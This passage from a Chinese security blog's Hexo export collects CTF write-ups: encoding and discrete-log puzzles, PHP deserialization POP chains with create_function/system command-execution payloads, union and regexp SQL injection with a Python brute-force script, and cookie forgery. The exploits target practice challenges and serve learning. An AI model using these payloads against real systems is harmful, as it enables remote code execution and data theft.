correct access rightsand the repository exists.FATAL Something&apos;s wrong. Maybe you can find the solution here: https://hexo.io/docs/troubleshooting.htmlError: Spawn failed at ChildProcess.&lt;anonymous&gt; (F:\Blog\Blog\node_modules\hexo-util\lib\spawn.js:52:19) at ChildProcess.emit (events.js:210:5) at ChildProcess.cp.emit (F:\Blog\Blog\node_modules\cross-spawn\lib\enoent.js:40:29) at Process.ChildProcess._handle.onexit (internal/child_process.js:272:12) 测试与github连接ssh -T git@github.com 12$ ssh -T git@github.comssh: connect to host github.com port 22: Connection refused 解决办法网络换成手机热点]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>报错记录</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9月Tamil CTF 2021]]></title>
    <url>%2F2021%2F09%2F27%2F9%E6%9C%88Tamil%20CTF%202021%2F</url>
    <content type="text"><![CDATA[Web-CringeNcoder分析过程就是一道编码解码题，没什么难度，刚开始以为是sql，后边又以为是模板注入，最后访问/flag，就明白了这道题的用意。 解题脚本12345678910dict = &#123;"cringe":"a", "cr1nge":"b","cRinge":'c',"crIng3":'d',"cRimG3":'e',"cR1Ng3e":'f',"criNgee":'g',"CRINGE":'h',"crinGE":'i',"ccR1nge":'j',"CriNGE":'k',"cRINGe":'l',"cr1ngE":'m',"cringE":'n',"CRIng3":'o',"Cr1nGe":'p',"cR1nnge":'q',"cR1Ng3":'r',"CrInGe":'s',"cRingE":'t',"cR1NGE":'u',"CRiNg3":'v',"CRINGe":'w',"CR1NGe":'x',"cring3":'y',"CRIMNGE":'z',"crinG3":1, "cRInge":2,"cRinG3":3 ,"criNG3":4 ,"cr1NG3":5 ,"crinGe":6,"cRiNge":7, "CrInGE":8 ,"CRinGE":9,"cRInGE":0&#125;str1 = "cR1Ng3e crinG3 cringE cringe cRINGe cRINGe cring3 crinG3 cringE cringE cRinG3 Cr1nGe cRimG3 criNG3 cRinge cRimG3 cringe cR1Ng3e cRiNge cRinG3 cR1Ng3 CrInGe cRInGE cr1ngE criNG3 cringE cring3 cRinge cR1Ng3 crinGE cringE criNgee cRinG3 CrInGe"list = str1.split(' ')s = ''for key in list: s += str(dict[key])print("TamilCTF&#123;"+s+"&#125;")]]></content>
      <categories>
        <category>CTF</category>
        <category>比赛复盘</category>
      </categories>
      <tags>
        <tag>编码解码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[9月DASCTF Sept X 浙江工业大学秋季挑战赛WP]]></title>
    <url>%2F2021%2F09%2F25%2FDASCTF%20Sept%20X%20%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9BWP%2F</url>
    <content type="text"><![CDATA[crypto-签到题目1234567891011121314#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomflag=b'flag&#123;******************&#125;'n = 2 ** 256flaglong=bytes_to_long(flag)m = random.randint(2, n-1) | 1c = pow(m, flaglong, n)print('m = ' + str(m))print('c = ' + str(c))# m = 73964803637492582853353338913523546944627084372081477892312545091623069227301# c = 21572244511100216966799370397791432119463715616349800194229377843045443048821 解题脚本123456789from sympy.ntheory import discrete_logn = 2 ** 256m = 73964803637492582853353338913523546944627084372081477892312545091623069227301c = 21572244511100216966799370397791432119463715616349800194229377843045443048821flag = discrete_log(n,c,m)print(hex(flag))# flag&#123;DASCTF_zjut&#125; misc-Girlfriend’s account解题过程1=SUM(ISNUMBER(SEARCH(TEXT(&#123;1,2,3,4,5,6,7,8,9&#125;,&quot;[dbnum2]&quot;&amp;&#123;&quot;0亿&quot;;&quot;0仟!*万&quot;;&quot;0佰!*万&quot;;&quot;0拾!*万&quot;;&quot;0万&quot;;&quot;万!*0仟&quot;;&quot;万!*0佰&quot;;&quot;万!*0拾&quot;;&quot;0元&quot;;&quot;0角&quot;;&quot;0分&quot;&#125;),IF(ISERR(FIND(&quot;万&quot;,A2)),&quot;万&quot;,)&amp;A2))*&#123;1,2,3,4,5,6,7,8,9&#125;*10^&#123;8;7;6;5;4;3;2;1;0;-1;-2&#125;) 1=IF(B2=&quot;壹&quot;,1,IF(B2=&quot;贰&quot;,2,IF(B2=&quot;叁&quot;,3,IF(B2=&quot;肆&quot;,4,IF(B2=&quot;伍&quot;,5,IF(B2=&quot;陆&quot;,6,IF(B2=&quot;柒&quot;,7,IF(B2=&quot;捌&quot;,8,IF(B2=&quot;玖&quot;,9,IF(B2=&quot;零&quot;,0)))))))))) web-hellounser考点反序列化（pop链构造） preg_match绕过 前置知识魔术方法 12__invoke 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。__toString 方法用于一个类被当成字符串时应怎样回应。(当类被 echo 当成字符串输出时，会调用该方法) 解题过程打开12345678910111213141516171819202122232425262728293031323334353637383940414243 &lt;?phpclass A &#123; public $var; public function show()&#123; echo $this-&gt;var; &#125; public function __invoke()&#123; $this-&gt;show(); &#125;&#125;class B&#123; public $func; public $arg; public function show()&#123; $func = $this-&gt;func; if(preg_match('/^[a-z0-9]*$/isD', $this-&gt;func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i', $this-&gt;arg)) &#123; die('No!No!No!'); &#125; else &#123; include "flag.php"; //There is no code to print flag in flag.php $func('', $this-&gt;arg); &#125; &#125; public function __toString()&#123; $this-&gt;show(); return "&lt;br&gt;"."Nice Job!!"."&lt;br&gt;"; &#125; &#125;if(isset($_GET['pop']))&#123; $aaa = unserialize($_GET['pop']); $aaa();&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 分析构造利用链 比较简单 1# $aaa();-&gt;A::__invoke() -&gt;A::show() -&gt; B::__toString -&gt;B::show() 通过$aaa();调用触发 A::__invoke()，A::__invoke()会触发A::show()，A::show()中有个echo输出，会触发B::__toString，B::__toString会触发B::show()； 接下来就是绕过。 getflag1234567if(preg_match('/^[a-z0-9]*$/isD', $this-&gt;func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i', $this-&gt;arg)) &#123; die('No!No!No!'); &#125; else &#123; include "flag.php"; //There is no code to print flag in flag.php $func('', $this-&gt;arg); &#125; 利用点 $func(&#39;&#39;, $this-&gt;arg); ，根据Code Breaking 挑战赛 Writeup。构造出 1234create_function(&apos;&apos;,&apos;return 123;&#125;phpinfo();//)等价于create_function()&#123; return 123;&#125;phpinfo();//) 当$func 为create_function，$this-&gt;arg为 return 123;}phpinfo();//)的时候，就会执行到phpinfo(); 上面只是构造了利用，这里还需要绕过两个条件。 12preg_match('/^[a-z0-9]*$/isD', $this-&gt;func)preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i', $this-&gt;arg) 第一个正则对传入的字符串进行了首位必须是字母数字的匹配，直接用wp中给出的 \ 绕过。 第二个正则过滤了很多的关键字，但是没有过滤base64_decode，system等函数，这里直接用base64_decode+system绕过，但是需要注意的 ，这个正则中过滤了= ，有时候进行base64编码的时候，会遇到末尾有=的情况，这种情况可以换成其他函数进行编码。构造如下payload 123$func=&quot;\create_function&quot;;$arg=&quot;return 111;&#125;system(base64_decode(d2hvYW1p));//&quot;;# d2hvYW1p whoami 序列化构造payload 123456789101112131415161718192021222324&lt;?php# 反序列化 Aclass A&#123; public $var;&#125;class B&#123; public $func; public $arg;&#125;if (1) &#123; $a = new A(); $b = new B(); $b-&gt;func = "\create_function"; $b-&gt;arg = "return 111;&#125;system(base64_decode(d2hvYW1p));//"; $a-&gt;var = $b; var_dump(serialize($a));&#125; else &#123; highlight_file(__FILE__);&#125; 得到 1O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:16:&quot;\create_function&quot;;s:3:&quot;arg&quot;;s:46:&quot;return 111;&#125;system(base64_decode(d2hvYW1p));//&quot;;&#125;&#125; 提交 成功执行 payload 12Y2F0IGZsYWcucGhw // cat flag.phpO:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:16:&quot;\create_function&quot;;s:3:&quot;arg&quot;;s:54:&quot;return 111;&#125;system(base64_decode(Y2F0IGZsYWcucGhw));//&quot;;&#125;&#125; 这里还需要查看 Tru3flag.php 文件，这里会存在一个小小的问题 123cat Tru3flag.php 进行base64编码后得到 Y2F0IFRydTNmbGFnLnBocA==后面会有两个=,不能过正则。这里我直接采用$&#123;IFS&#125;代替空格。cat$&#123;IFS&#125;Tru3flag.php 进行base64编码 得到 Y2F0JHtJRlN9VHJ1M2ZsYWcucGhw 1O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;O:1:&quot;B&quot;:2:&#123;s:4:&quot;func&quot;;s:16:&quot;\create_function&quot;;s:3:&quot;arg&quot;;s:66:&quot;return 111;&#125;system(base64_decode(Y2F0JHtJRlN9VHJ1M2ZsYWcucGhw));//&quot;;&#125;&#125; web-xxc考点源码泄露 反序列化（多个文件的pop链构造） 前言这道题对于我来说还算是比较难，在网上找到一位师傅写的wp，只能到执行phpinfo，不能拿到flag，目前这道题的wp还没有师傅公布出来，做这道题对于构造pop链有一定提升，所以照着这位大佬的wp复现。 wp 地址 https://blog.csdn.net/weixin_43610673/article/details/120496058 前置知识魔术方法 123456__destruct 该函数会在类的一个对象被删除时自动调用。__call 在对象中调用一个不可访问方法时，__call() 会被调用。__get 读取不可访问（protected 或 private）或不存在的属性的值时，__get() 会被调用__toString 方法用于一个类被当成字符串时应怎样回应。其实就是调用__isset 当对不可访问（protected 或 private）或不存在的属性调用 isset() 或 empty()。会被调用。__invoke 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。 复现过程这道题通过扫目录，扫到了源码，直接在本地搭建复现。 目录结构 因为文件太多，直接就贴关键地方截图了。 利用点 目前只发现一个利用点，这个利用点位与 class\Method\Func\GenerateFile.php 文件，GenerateFile的myGen方法中call_user_fun函数 ，这个利用点的$length并不可控，这也就是为什么只能执行 phpinfo() 的原因，因为不能控制参数。 pop链构造class\Control\State\StopHook.php 序列化入口，class\Control\State\StopHook.php , 当序列化StopHook类的时候，会自动调用__destruct方法，在__destruct方法中又会调用_exit，这里的_exit方法中的 $process-&gt;stop() 能够触发 class\Faker\MyGenerator.php 中MyGenerator的__call方法。 class\Faker\MyGenerator.php __call方法中的echo $this-&gt;defaultCall能够触发class\Method\Func\GetFile.php中的GetFile类的__toString方法，__toString中会调用getFiles方法，而getFiles方法中的 $this-&gt;flag-&gt;{$this-&gt;value}能够触发class\Method\Func\GetDefault.php中的__isset方法。 class\Method\Func\GetFile.php class\Method\Func\GetDefault.php class\Method\Func\GetDefault.php中的__isset方法会调用popup 方法，popup方法中的 return $s($length) ,可以触发class\Method\Func\GenerateFile.php中的__invoke方法，而__invoke方法又会调用 myGen，通过控制$this-&gt;source-&gt;generate来执行phpinfo。 class\Method\Func\GenerateFile.php 链条 1StopHook::__destruct-&gt;StopHook::_exit-&gt;MyGenerator::__call-&gt;GetFile::__toString-&gt;GetFile::getFiles-&gt;GetDefault::__isset-&gt;GetDefault::popup-&gt;GenerateFile::__invoke-&gt;GenerateFile::myGen-&gt;利用点call_user_func 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150&lt;?phpnamespace Control\State&#123; use Faker\MyGenerator; class StopHook &#123; protected $output; protected $config = ['auto' =&gt; 0]; protected static $states = ['started', 'running', 'finished', 'waiting', 'fail']; protected $processes; # 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 public function __construct() &#123; $this-&gt;processes = [new MyGenerator()]; &#125; public function __destruct() &#123;// echo "123666"; $this-&gt;_exit(); &#125; private function _exit() &#123; // 返回单元顺序相反的数组 逆序数组 foreach(array_reverse($this-&gt;processes) as $process) &#123; // if (!$process-&gt;isRunning) &#123;// echo "omg"; continue; &#125; # $process-&gt;stop() 通常可触发__call # $process = $process-&gt;stop(); &#125; &#125; &#125;&#125;namespace Faker&#123; use Method\Func\GetFile; class MyGenerator &#123; protected $defaultValue; public function __construct() &#123; $this-&gt;defaultValue = new GetFile(); &#125; # 在对象中调用一个不可访问方法时调用 public function __call($method, $arg_array) &#123;// echo "__call"; echo $this-&gt;defaultCall; return $this-&gt;defaultCall; &#125; # 获得一个类的成员变量时调用 public function __get($property) &#123;// echo "__get"; return $this-&gt;defaultValue; &#125; &#125;&#125;namespace Method\Func&#123; class GenerateFile &#123; public $flag; protected $buffer; # __invoke 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。 public function __construct() &#123; $this-&gt;source-&gt;generate = "phpinfo"; &#125; public function __invoke($param) &#123;// echo "__invoke"; $this-&gt;myGen($param); &#125; public function myGen($length) &#123;// echo "myGen"; $s = $this-&gt;buffer-&gt;read; # 利用点 call_user_func($this-&gt;source-&gt;generate, $length); return $s; &#125; &#125; class GetDefault &#123; private $source; public function __construct() &#123; $this-&gt;source = new GenerateFile(); $this-&gt;source-&gt;flag = "myTest"; &#125; public function popup($length) &#123;// echo "popup"; $s = $this-&gt;source; if ($s-&gt;flag != "myTest") &#123; return "denied"; &#125; return $s($length); &#125; # 当对不可访问属性调用 isset()或empty()时调用 public function __isset($property) &#123;// echo "__isset";// echo $property; if ($property != "test") &#123; return false; &#125; return !$this-&gt;popup(666); &#125; &#125; class GetFile &#123; private $flag = true; private $files = []; # 类被当成字符串时的回应方法 public function __construct() &#123; $this-&gt;flag = new GetDefault(); $this-&gt;value = 'test'; &#125; public function __toString() &#123; #// echo "__toString"; return $this-&gt;getFiles(); &#125; public function getFiles() &#123; if (!$this-&gt;flag) return "denied"; $s = ""; if (isset($this-&gt;flag-&gt;&#123;$this-&gt;value&#125;)) &#123; return "test"; &#125; foreach ($this-&gt;files as $file) &#123; $s += $file-&gt;read(); &#125; return $s; &#125; &#125;&#125;namespace &#123; # StopHook::__destruct-&gt;StopHook::_exit-&gt;MyGenerator::__call-&gt;GetFile::__toString-&gt;GetFile::getFiles-&gt;GetDefault::__isset-&gt;GetDefault::popup-&gt;GenerateFile::__invoke-&gt;GenerateFile::myGen-&gt;利用点call_user_func # StopHook::__destruct-&gt;StopHook::_exit-&gt;MyGenerator::__get-&gt;GetDefault::__isset-&gt;GetDefault::popup-&gt;GenerateFile::__invoke-&gt;利用点call_user_func echo base64_encode(serialize(new Control\State\StopHook()));&#125; 得到 1TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6Mzp7czo5OiIAKgBvdXRwdXQiO047czo5OiIAKgBjb25maWciO2E6MTp7czo0OiJhdXRvIjtpOjA7fXM6MTI6IgAqAHByb2Nlc3NlcyI7YToxOntpOjA7TzoxNzoiRmFrZXJcTXlHZW5lcmF0b3IiOjE6e3M6MTU6IgAqAGRlZmF1bHRWYWx1ZSI7TzoxOToiTWV0aG9kXEZ1bmNcR2V0RmlsZSI6Mzp7czoyNToiAE1ldGhvZFxGdW5jXEdldEZpbGUAZmxhZyI7TzoyMjoiTWV0aG9kXEZ1bmNcR2V0RGVmYXVsdCI6MTp7czozMDoiAE1ldGhvZFxGdW5jXEdldERlZmF1bHQAc291cmNlIjtPOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiOjM6e3M6NDoiZmxhZyI7czo2OiJteVRlc3QiO3M6OToiACoAYnVmZmVyIjtOO3M6Njoic291cmNlIjtPOjg6InN0ZENsYXNzIjoxOntzOjg6ImdlbmVyYXRlIjtzOjc6InBocGluZm8iO319fXM6MjY6IgBNZXRob2RcRnVuY1xHZXRGaWxlAGZpbGVzIjthOjA6e31zOjU6InZhbHVlIjtzOjQ6InRlc3QiO319fX0 执行 小结没成功拿到flag，也学到了不少，也是头一次构造这么复杂的pop链。还是太菜了。 拿flag的解法前言上次做到只能执行phpinfo，就有点不甘心，为什么别人就能getshell，我就不能。经过这几天在群里咨询一些师傅，一个师傅(Object师傅)给了我一条博客链接2021 第二届 “祥云杯” 网络安全大赛 WEB WriteUp，里面是祥云杯的ezyii 题wp，不过题目内容大致差不多，有一个点基本一样，就是用call_user_func($this-&gt;source-&gt;generate,$length);，只能控制$this-&gt;source-&gt;generate，而不能控制$length。这里到底要怎么才能利用呢？答案是回调函数。但是知道答案后，并没有第一时间做出来，我把$this-&gt;source-&gt;generate赋值为function (){system(&#39;phpinfo();&#39;);} ，然后进行反序列化的时候，没有了回显，这里一直卡了我很久。 直到看到 Opis Closure If you ever used closures then you probably know that closures are not serializable. Trying to serialize a closure will result into an exception: 如果您曾经使用过闭包，那么您可能知道闭包是不可序列化的。尝试序列化闭包将导致异常： 意思就是以function (){system(&#39;phpinfo();&#39;);}的方式进行序列化，会失败。 1234567891011use Opis\Closure\SerializableClosure;// Recursive factorial closure$factorial = function ($n) use (&amp;$factorial) &#123; return $n &lt;= 1 ? 1 : $factorial($n - 1) * $n;&#125;;// Wrap the closure$wrapper = new SerializableClosure($factorial);// Now it can be serialized$serialized = serialize($wrapper); 里面给出了序列化闭包的方式，但当我按照里面的方式去使用的时候，发现还是没有回显。 直到今早 ，又重新看了这篇博客祥云杯2021 ezyii的反序列化pop链分析，这篇描述得更详细些。得到。 1234567891011121314final class PumpStream&#123; private $source; private $size=-10; private $buffer; public function __construct()&#123; $this-&gt;buffer=new DefaultGenerator('j'); include("closure/autoload.php"); $a = function()&#123;phpinfo();&#125;; $a = \Opis\Closure\serialize($a); $b = unserialize($a); $this-&gt;source=$b; &#125; &#125;&#125; 里面对$a = function(){phpinfo();};进行了如下三个步骤，序列化闭包，反序列化，赋值给$this-&gt;source。当我按照这样的方式去构造时，我又遇到了没有回显的问题，为此，我还特地弄了个xdebug调试，调试到$a = \Opis\Closure\serialize($a);就结束了。为什么会这样呢?经过对比两份payload，我发现，人家都引入了include(&quot;closure/autoload.php&quot;);，这个文件，这也是解决问题的关键所在，这个就是\Opis\Closure\serialize的环境。 接下来直接贴payload。 拿flag payload123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157&lt;?phpnamespace Control\State;use Faker\MyGenerator;class StopHook &#123; protected $output; protected $config = ['auto' =&gt; 0]; protected static $states = ['started', 'running', 'finished', 'waiting', 'fail']; protected $processes; # 析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。 public function __construct() &#123; $this-&gt;processes = [new MyGenerator()]; &#125; public function __destruct() &#123; echo "__destruct"."\n"; $this-&gt;_exit(); &#125; private function _exit() &#123; echo "_exit"."\n"; // 返回单元顺序相反的数组 逆序数组 foreach(array_reverse($this-&gt;processes) as $process) &#123; # 这里会触发__get() 但是不会执行 continue if (!$process-&gt;isRunning) &#123; continue; &#125; # $process-&gt;stop() 通常可触发__call 但是并没有触发 # 这里会触发 __call() $process-&gt;stop(); &#125; &#125;&#125;# 序列化echo base64_encode(serialize(new StopHook()));namespace Faker;use Method\Func\GetFile;class MyGenerator &#123; protected $defaultValue; public function __construct() &#123; $this-&gt;defaultValue = new GetFile(); &#125; # 在对象中调用一个不可访问方法时调用 public function __call($method, $arg_array) &#123; echo "__call"."\n"; echo $this-&gt;defaultCall; return $this-&gt;defaultCall; &#125; # 获得一个类的成员变量时调用 public function __get($property) &#123; echo "__get"."\n"; # return new GetFile(); return $this-&gt;defaultValue; &#125;&#125;namespace Method\Func;class GetFile &#123; private $flag = true; private $files = []; public function __construct() &#123; $this-&gt;flag = new GetDefault(); $this-&gt;value = 'test'; &#125; # 类被当成字符串时的回应方法 public function __toString() &#123; echo "__toString"; # return $this-&gt;getFiles(); &#125; public function getFiles() &#123; if (!$this-&gt;flag) return "denied"; $s = ""; # 这里能够触发 _isset if (isset($this-&gt;flag-&gt;&#123;$this-&gt;value&#125;)) &#123; return "test"; &#125; foreach ($this-&gt;files as $file) &#123; $s += $file-&gt;read(); &#125; return $s; &#125;&#125;namespace Method\Func;class GetDefault &#123; private $source; public function __construct() &#123; $this-&gt;source = new GenerateFile(); $this-&gt;source-&gt;flag = 'myTest'; &#125; public function popup($length) &#123; echo "popup"."\n"; $s = $this-&gt;source; if ($s-&gt;flag != "myTest") &#123; return "denied"; &#125; return $s($length); &#125; # 当对不可访问属性或调用isset()或empty()时调用 public function __isset($property) &#123; echo "__isset"."\n"; if ($property != "test") &#123; return false; &#125; return !$this-&gt;popup(666); &#125;&#125;namespace Method\Func;class GenerateFile &#123; public $flag; protected $buffer; # __invoke 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。 public function __construct() &#123; include("closure/autoload.php"); $a = function ()&#123;system('cat /f1@g.txt');&#125;; $a = \Opis\Closure\serialize($a); $b = unserialize($a); $this-&gt;source-&gt;generate = $b;// $this-&gt;source-&gt;generate = 'phpinfo'; // 能够执行 &#125; public function __invoke($param) &#123; echo "__invoke"."\n"; $this-&gt;myGen($param); &#125; public function myGen($length) &#123; $s = $this-&gt;buffer-&gt;read; # 利用点// call_user_func($this-&gt;source-&gt;generate, $length); call_user_func($this-&gt;source-&gt;generate,$length); return $s; &#125;&#125;?&gt; 1TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6Mzp7czo5OiIAKgBvdXRwdXQiO047czo5OiIAKgBjb25maWciO2E6MTp7czo0OiJhdXRvIjtpOjA7fXM6MTI6IgAqAHByb2Nlc3NlcyI7YToxOntpOjA7TzoxNzoiRmFrZXJcTXlHZW5lcmF0b3IiOjE6e3M6MTU6IgAqAGRlZmF1bHRWYWx1ZSI7TzoxOToiTWV0aG9kXEZ1bmNcR2V0RmlsZSI6Mzp7czoyNToiAE1ldGhvZFxGdW5jXEdldEZpbGUAZmxhZyI7TzoyMjoiTWV0aG9kXEZ1bmNcR2V0RGVmYXVsdCI6MTp7czozMDoiAE1ldGhvZFxGdW5jXEdldERlZmF1bHQAc291cmNlIjtPOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiOjM6e3M6NDoiZmxhZyI7czo2OiJteVRlc3QiO3M6OToiACoAYnVmZmVyIjtOO3M6Njoic291cmNlIjtPOjg6InN0ZENsYXNzIjoxOntzOjg6ImdlbmVyYXRlIjtDOjMyOiJPcGlzXENsb3N1cmVcU2VyaWFsaXphYmxlQ2xvc3VyZSI6MTkxOnthOjU6e3M6MzoidXNlIjthOjA6e31zOjg6ImZ1bmN0aW9uIjtzOjM4OiJmdW5jdGlvbiAoKXtcc3lzdGVtKCdjYXQgL2YxQGcudHh0Jyk7fSI7czo1OiJzY29wZSI7czoyNDoiTWV0aG9kXEZ1bmNcR2VuZXJhdGVGaWxlIjtzOjQ6InRoaXMiO047czo0OiJzZWxmIjtzOjMyOiIwMDAwMDAwMDAyZjEwODQ3MDAwMDAwMDA3YWMzZTgwYiI7fX19fX1zOjI2OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmaWxlcyI7YTowOnt9czo1OiJ2YWx1ZSI7czo0OiJ0ZXN0Ijt9fX19 总结这道题做了很长时间，挺耽误时间的，经常是看着屏幕，一点思路都没有。但是反过来说，下次再遇到这个题，我还是只能执行phpinfo，会很不甘心。 web-ctfmanage解题过程sql注入检测注入方式 12a=1 uniunionon selselectect 1,2,3#&amp;b=1 a=1 Union Select 1,2,3#&amp;b=1 获取数据库表 121 Union Select 1,2,database();# =&gt;ctf 获取表名 121 Union Select 1,2,group_concat(table_name) From mysql.innodb_table_stats Where database_name = database();#=&gt;flagisthere,ilikectf 无列名注入获取值 121 Union Select * From ilikectf;# =&gt;36476,sgrsgef,gg.php 代码审计打开gg.php 12345678910111213if(base64_encode(hex2bin(strrev(bin2hex($_GET['sy']))))===$secret)&#123; if($_POST['ha']!==$_POST['lo']&amp;&amp;md5($_POST['ha'])===md5($_POST['lo']))&#123; echo $flag; &#125; else&#123; echo 'ohhhhh so close !!!'; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 看到第一个条件可能会愣住，不过不影响，在登录页面看源代码的时候得到。 1hjZX1pcnVmdmRzZWZ/bGlg== 1echo hex2bin(strrev(bin2hex(base64_decode("hjZX1pcnVmdmRzZWZ/bGlg==")))); 得到 1ilovectfverymuch 绕过 1if($_POST[&apos;ha&apos;]!==$_POST[&apos;lo&apos;]&amp;&amp;md5($_POST[&apos;ha&apos;])===md5($_POST[&apos;lo&apos;])) POST： 1ha[]=a&amp;lo[]=b 获取flag 小结这道题的难点我觉得主要是在注入点检测、和无列名获取值的payload构造，并不是那种常规思路，我也不知道为什么通过Union Select 或ununionion selselectect这样能够检测出来，看不到源码。不过可以通过FUZZ，但我不太熟，而且也没有字典，是时候收集一波了。]]></content>
      <categories>
        <category>CTF</category>
        <category>比赛复盘</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>SQL注入</tag>
        <tag>crypto</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【NCTF2019】SQLi 1]]></title>
    <url>%2F2021%2F08%2F27%2F%5BNCTF2019%5DSQLi%201%2F</url>
    <content type="text"><![CDATA[考点sql注入（regexp注入） 前置知识regexp注入 在sql语句中 select database(); // 是输出当前打开的是数据库名 select database() regexp”^d”; // 这样可以匹配数据库名的开头是 d 是就会返回 1 不是则返回0 当sql语句是这样 select * from users where user=’’||password; 可以看到出来两条数据，至于为什么会出来两条数据，我很好奇，按理说 &#39;&#39;||password 为逻辑运算，结果 只能为1 或者 0 ，当user =0/1的时候，并没有字段能够满足，但还是查询出来两条数据？？？先不纠结这个，做题要紧。 接下来 可以通过 &#39;&#39;||passwor dregexp&quot;^8d&quot; 的方式 不断匹配出数据当中 password的值。 这个就是regexp注入。 解题过程打开 一个登录页面，还显示了提交的sql语句。 dirsearch扫目录1python3 dirsearch.py -u &quot;http://08df778b-b131-45e7-9eff-822311e44b07.node4.buuoj.cn:81/&quot; -x 404,429 -s 1 可以得到一些提示信息，打开 robots.txt 实际上提示的就是 hint.txt 可以发现过滤了很多关键字，提示信息说只需要找到admin的密码 提交，然后就能拿到flag。 这种题我也没做过，直接跟随大佬的脚步，看了wp，regexp注入。 首先构造payload。 1username=\&amp;passwd=||passwd/**/regexp&quot;^y&quot;;%00 为什么要这么构造呢？ 1234567891011页面上回显的sql语句select * from users where username=&apos;&apos; and passwd=&apos;&apos;我们通过username 传入 \ 这样可以把&apos;转义掉 变成这样select * from users where username=&apos;\&apos; and passwd=&apos;&apos;此时的 \&apos; and passwd=&apos; 就成了 username的值在通过传入 passwd 传入 ||passwd/**/regexp&quot;^y&quot;;%00select * from users where username=&apos;\&apos; and passwd=&apos;||passwd/**/regexp&quot;^y&quot;;%00&apos;就和前置知识类似了select * from users where username=&apos;&apos;||passwd/**/regexp&quot;^y&quot;;%00&apos; 后边的%00相当于截断了后边的字符，看了下php 对应版本为 5.2.16,存在截断漏洞，接下来只需要遍历 regexp&quot;^x&quot; 中的 x即可 python写脚本1234567891011121314151617181920212223242526272829import requestsfrom urllib import parseurl = "http://08df778b-b131-45e7-9eff-822311e44b07.node4.buuoj.cn:81/"# 构造字典dict_list = [ i for i in range(97,123)]shuzi = [i for i in range(48,58)]dict_list +=shuzidict_list.append(95)flag = ''for i in range(50): for j in dict_list: payload = '||passwd/**/regexp"^%s";\x00'%(flag+chr(j)) datas = &#123; 'username': '\\', 'passwd': payload &#125; print(datas) import time time.sleep(1) res = requests.post(url=url,data=datas) # print(res.text) if 'welcome.php' in res.text : flag += chr(j) print("[+] "+flag) break 容易跑到一半就报错，直接把得到的结果手动拼上去继续跑 得到 1you_will_never_know7788990 提交 1username=&amp;passwd=you_will_never_know7788990 总结这道题，又让我学到了sql注入的一种新姿势。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQL注入(regexp注入)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【BSidesCF 2019】Cookie 1]]></title>
    <url>%2F2021%2F08%2F24%2F%5BBSidesCF%202019%5DCookie%201%2F</url>
    <content type="text"><![CDATA[考点：Cookie伪造打开 两个提示信息 123 Log in as admin!We found the account cookie / monster 我以为多难，就只是伪造一下cookie。刚开始测试了sql注入，没反应。又用dirsearch扫了目录，翻了源代码。 这里提到了cookie，伪造Cookie，直接回显了flag。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Cookie伪造</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【b01lers2020】Welcome to Earth 1]]></title>
